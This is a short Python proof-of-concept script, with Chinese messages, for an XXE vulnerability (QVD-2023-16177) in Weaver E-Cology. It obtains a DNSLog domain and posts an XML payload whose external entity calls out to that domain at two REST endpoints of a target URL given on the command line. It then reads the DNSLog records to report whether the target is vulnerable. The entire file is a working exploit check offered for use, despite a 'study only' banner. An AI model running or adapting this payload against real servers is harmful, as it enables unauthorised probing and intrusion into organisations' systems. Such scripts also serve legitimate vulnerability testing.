import requests
import sys
import time

def title():
    print("")
    print("")
    print('+------------------------------------------')
    print("泛微E-Cology XXE")
    print('QVD-2023-16177-----漏洞检测----------------')
    print("仅限学习使用，请勿用于非法测试！")
    print('+------------------------------------------')
    print("")

def dnslog_req():
    headers_dnslog = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Cookie": "PHPSESSID=j4fhkio796ki8t6upvarcf9hb5"
    }
    try:
        req=requests.get("http://www.dnslog.cn/getdomain.php?t=0.3788026823137127", headers=headers_dnslog,timeout=10)
        time.sleep(3)
        return req.text
    except:
        print("请求发生错误，请查看 http://www.dnslog.cn/ 是否可访问")
        sys.exit()

def dnslog_res():
    headers_dnslog = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Cookie": "PHPSESSID=j4fhkio796ki8t6upvarcf9hb5"
    }
    try:
        response_dnslog=requests.get("http://www.dnslog.cn/getrecords.php?t=0.3788026823137127", headers=headers_dnslog,timeout=10)
        if(len(response_dnslog.text)!=2):
            print("-------------------" + "存在漏洞" + "-------------------")
        else:
            print("-------------------" + "可惜了，不存在漏洞" + "-------------------")
    except:
        print("请求发生错误，请查看 http://www.dnslog.cn/ 是否可访问2")

def poc(url,dnslog_str):
    data='''<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE syscode SYSTEM "http://'''+dnslog_str+'''/1.txt">
<M><syscode>&send;</syscode></M>
'''

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36",
        "Content-Type": "application/xml"
    }

    # 无视证书不报错
    requests.packages.urllib3.disable_warnings()

    try:
        requests.post(url+"/rest/ofs/ReceiveCCRequestByXml",headers=headers,data=data,timeout=5,verify=False)
        requests.post(url+"/rest/ofs/deleteUserRequestInfoByXml",headers=headers,data=data,timeout=5,verify=False)
    except:
        print("请求发生错误，请检查url是否可访问")
        sys.exit()

def input():
    option=sys.argv[1]
    if option=="-u":
        url=sys.argv[2]
        return url
    else:
        print("使用方式：QVD-2023-16177.py -u http://www.example.com")
        sys.exit()
if __name__ == '__main__':
    title()
    url=input()
    dnslog=dnslog_req()
    poc(url,dnslog)
    dnslog_res()